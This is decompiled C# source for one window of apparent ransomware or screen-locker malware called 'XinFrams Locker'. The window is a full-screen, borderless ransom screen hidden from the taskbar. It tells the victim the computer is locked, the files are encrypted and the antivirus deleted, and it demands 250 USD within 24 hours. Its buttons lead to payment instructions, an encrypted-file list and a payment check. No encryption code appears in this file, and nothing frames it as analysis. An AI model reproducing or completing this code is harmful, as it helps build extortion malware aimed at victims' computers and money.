using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;

namespace XinFrams_Locker;

public class Form3 : Form
{
	private IContainer components = null;

	private PictureBox pictureBox1;

	private Label label1;

	private Label label2;

	private Label label3;

	private Label label4;

	private Label label5;

	private Label label6;

	private Button button1;

	private Button button2;

	private Button button3;

	private Button button4;

	private Label label7;

	public Form3()
	{
		InitializeComponent();
	}

	private void Form3_Load(object sender, EventArgs e)
	{
	}

	private void button1_Click(object sender, EventArgs e)
	{
		Form4 form = new Form4();
		((Control)form).Show();
	}

	private void button2_Click(object sender, EventArgs e)
	{
		Form5 form = new Form5();
		((Control)form).Show();
	}

	private void button3_Click(object sender, EventArgs e)
	{
		Form6 form = new Form6();
		((Control)form).Show();
	}

	private void button4_Click(object sender, EventArgs e)
	{
		Form7 form = new Form7();
		((Control)form).Show();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_013c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0146: Expected O, but got Unknown
		//IL_01c3: Unknown result type (might be due to invalid IL or missing references)
		//IL_01cd: Expected O, but got Unknown
		//IL_024d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0257: Expected O, but got Unknown
		//IL_02d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_02e1: Expected O, but got Unknown
		//IL_0361: Unknown result type (might be due to invalid IL or missing references)
		//IL_036b: Expected O, but got Unknown
		//IL_03eb: Unknown result type (might be due to invalid IL or missing references)
		//IL_03f5: Expected O, but got Unknown
		//IL_0469: Unknown result type (might be due to invalid IL or missing references)
		//IL_0473: Expected O, but got Unknown
		//IL_050a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0514: Expected O, but got Unknown
		//IL_05ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_05b5: Expected O, but got Unknown
		//IL_064d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0657: Expected O, but got Unknown
		//IL_06fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0705: Expected O, but got Unknown
		//IL_0884: Unknown result type (might be due to invalid IL or missing references)
		//IL_088e: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form3));
		pictureBox1 = new PictureBox();
		label1 = new Label();
		label2 = new Label();
		label3 = new Label();
		label4 = new Label();
		label5 = new Label();
		label6 = new Label();
		button1 = new Button();
		button2 = new Button();
		button3 = new Button();
		button4 = new Button();
		label7 = new Label();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)pictureBox1).set_BackgroundImage((Image)componentResourceManager.GetObject("pictureBox1.BackgroundImage"));
		((Control)pictureBox1).set_Location(new Point(561, 12));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(255, 194));
		pictureBox1.set_TabIndex(0);
		pictureBox1.set_TabStop(false);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("UD デジタル 教科書体 NK-B", 20.25f, (FontStyle)1, (GraphicsUnit)3, (byte)128));
		((Control)label1).set_Location(new Point(62, 229));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(1236, 31));
		((Control)label1).set_TabIndex(1);
		((Control)label1).set_Text("Ooops! Your Computer Has Been Locked!! And All Your Important Files Are Encrypted!!!");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("UD デジタル 教科書体 NK-B", 20.25f, (FontStyle)1, (GraphicsUnit)3, (byte)128));
		((Control)label2).set_Location(new Point(218, 273));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(893, 31));
		((Control)label2).set_TabIndex(2);
		((Control)label2).set_Text("Your Computer File is AES-256 And RSA-2048 To Encrypting!!");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("UD デジタル 教科書体 NK-B", 20.25f, (FontStyle)1, (GraphicsUnit)3, (byte)128));
		((Control)label3).set_Location(new Point(131, 319));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(1115, 31));
		((Control)label3).set_TabIndex(3);
		((Control)label3).set_Text("Your File Recovery Tool And AntiVirus Soft Is Deleting!! What Virus Deleting??");
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Font(new Font("UD デジタル 教科書体 NK-B", 20.25f, (FontStyle)1, (GraphicsUnit)3, (byte)128));
		((Control)label4).set_Location(new Point(364, 364));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(680, 31));
		((Control)label4).set_TabIndex(4);
		((Control)label4).set_Text("250USD Payment To Computer Have Unlocked!!\r\n");
		((Control)label5).set_AutoSize(true);
		((Control)label5).set_Font(new Font("UD デジタル 教科書体 NK-B", 20.25f, (FontStyle)1, (GraphicsUnit)3, (byte)128));
		((Control)label5).set_Location(new Point(319, 410));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(739, 31));
		((Control)label5).set_TabIndex(5);
		((Control)label5).set_Text("24Hours Noting Payment To Notwaking Payment.....");
		((Control)label6).set_AutoSize(true);
		((Control)label6).set_Font(new Font("UD デジタル 教科書体 NK-B", 20.25f, (FontStyle)1, (GraphicsUnit)3, (byte)128));
		((Control)label6).set_Location(new Point(419, 501));
		((Control)label6).set_Name("label6");
		((Control)label6).set_Size(new Size(551, 31));
		((Control)label6).set_TabIndex(6);
		((Control)label6).set_Text("Your Personal ID:Jh6Yax17Uw5Ye48L");
		((Control)button1).set_Font(new Font("UD デジタル 教科書体 NK-B", 20.25f, (FontStyle)1, (GraphicsUnit)3, (byte)128));
		((Control)button1).set_Location(new Point(306, 552));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(271, 40));
		((Control)button1).set_TabIndex(7);
		((Control)button1).set_Text("How To Payment?");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)button2).set_Font(new Font("UD デジタル 教科書体 NK-B", 20.25f, (FontStyle)1, (GraphicsUnit)3, (byte)128));
		((Control)button2).set_Location(new Point(595, 552));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(188, 40));
		((Control)button2).set_TabIndex(8);
		((Control)button2).set_Text("Show Rules");
		((ButtonBase)button2).set_UseVisualStyleBackColor(true);
		((Control)button2).add_Click((EventHandler)button2_Click);
		((Control)button3).set_Font(new Font("UD デジタル 教科書体 NK-B", 20.25f, (FontStyle)1, (GraphicsUnit)3, (byte)128));
		((Control)button3).set_Location(new Point(800, 552));
		((Control)button3).set_Name("button3");
		((Control)button3).set_Size(new Size(300, 40));
		((Control)button3).set_TabIndex(9);
		((Control)button3).set_Text("Encrypted File List");
		((ButtonBase)button3).set_UseVisualStyleBackColor(true);
		((Control)button3).add_Click((EventHandler)button3_Click);
		((Control)button4).set_Font(new Font("UD デジタル 教科書体 NK-B", 20.25f, (FontStyle)1, (GraphicsUnit)3, (byte)128));
		((Control)button4).set_Location(new Point(306, 598));
		((Control)button4).set_Name("button4");
		((Control)button4).set_Size(new Size(794, 38));
		((Control)button4).set_TabIndex(10);
		((Control)button4).set_Text("Check Payment");
		((ButtonBase)button4).set_UseVisualStyleBackColor(true);
		((Control)button4).add_Click((EventHandler)button4_Click);
		((Control)label7).set_AutoSize(true);
		((Control)label7).set_Font(new Font("UD デジタル 教科書体 NK-B", 20.25f, (FontStyle)1, (GraphicsUnit)3, (byte)128));
		((Control)label7).set_Location(new Point(251, 454));
		((Control)label7).set_Name("label7");
		((Control)label7).set_Size(new Size(892, 31));
		((Control)label7).set_TabIndex(11);
		((Control)label7).set_Text("The XinFrams Locker Coded by @hukubabaawww351JP_Hacker");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 12f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.FromArgb(0, 192, 0));
		((Form)this).set_ClientSize(new Size(1282, 715));
		((Control)this).get_Controls().Add((Control)(object)label7);
		((Control)this).get_Controls().Add((Control)(object)button4);
		((Control)this).get_Controls().Add((Control)(object)button3);
		((Control)this).get_Controls().Add((Control)(object)button2);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)label6);
		((Control)this).get_Controls().Add((Control)(object)label5);
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Control)this).set_Font(new Font("MS UI Gothic", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)128));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form3");
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("Your Computer Has Been Locked!!");
		((Form)this).set_WindowState((FormWindowState)2);
		((Form)this).add_Load((EventHandler)Form3_Load);
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
